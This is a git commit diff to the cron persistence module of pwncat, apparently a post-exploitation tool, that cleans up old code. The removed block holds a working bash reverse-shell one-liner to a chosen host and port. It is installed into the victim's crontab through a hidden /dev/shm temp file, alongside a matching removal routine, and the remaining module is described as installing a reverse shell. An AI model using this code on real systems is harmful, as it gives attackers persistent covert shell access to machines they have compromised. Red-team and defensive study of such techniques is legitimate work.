f1e0245bae47f2c9ce9297cca5b8899c7b23ecb0
montysecurity <jacobcainmontgomery@gmail.com>
2020-10-13 19:37:02 -0500

    Removed old code

--- pwncat/modules/persist/cron.py
+++ pwncat/modules/persist/cron.py
@@ -1,12 +1,8 @@
-import os, pwncat, random
+#!/usr/bin/env python3
+import pwncat, random
 from crontab import CronTab
-#from cron_descriptor import get_description, ExpressionDescriptor
 from pwncat.modules import Argument, Status, PersistType, PersistError
 from pwncat.modules.persist import PersistModule
-#from pwncat import util
-#from pwncat.persist import PersistenceMethod, PersistenceError
-#from pwncat.util import Access, CompilationError, console
-#import pwncat
 
 class Module(PersistModule):
     """ Install a reverse shell (executed by /bin/bash) in the current user's crontab """
@@ -65,25 +61,3 @@ class Module(PersistModule):
                     # if number = * then do not set, the crontab module assumes that as default
             cron.write()
             yield Status("Installed the following cron: " + str(schedule) + str(payload))
-
-
-'''
-
-    #system = False
-    #name = "cron"
-    #local = True
-    def install(self, user):
-        # Setting Variables for Callback. Cron syntax is not verified
-        # An error in the crontab syntax does not disrupt current crons
-        cron = str(input("Input Cron Scedule: ")).strip()
-        rhost = str(input("LHOST? ")).strip()
-        rport = str(input("LPORT? ")).strip()
-        # Listing all crons and creating a temp file so we can make sure that all currently installed crons stay that way
-        # Bash oneliner using "pwncat" string to differentiate our cron from any existing ones
-        # Installing original list of crons, with the reverse shell added to it 
-        pwncat.victim.run("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
-        print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
-    def remove(self, user):
-        # Using "pwncat" string to remove our crons and reinstalling the original ones
-        pwncat.victim.run("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")
-'''
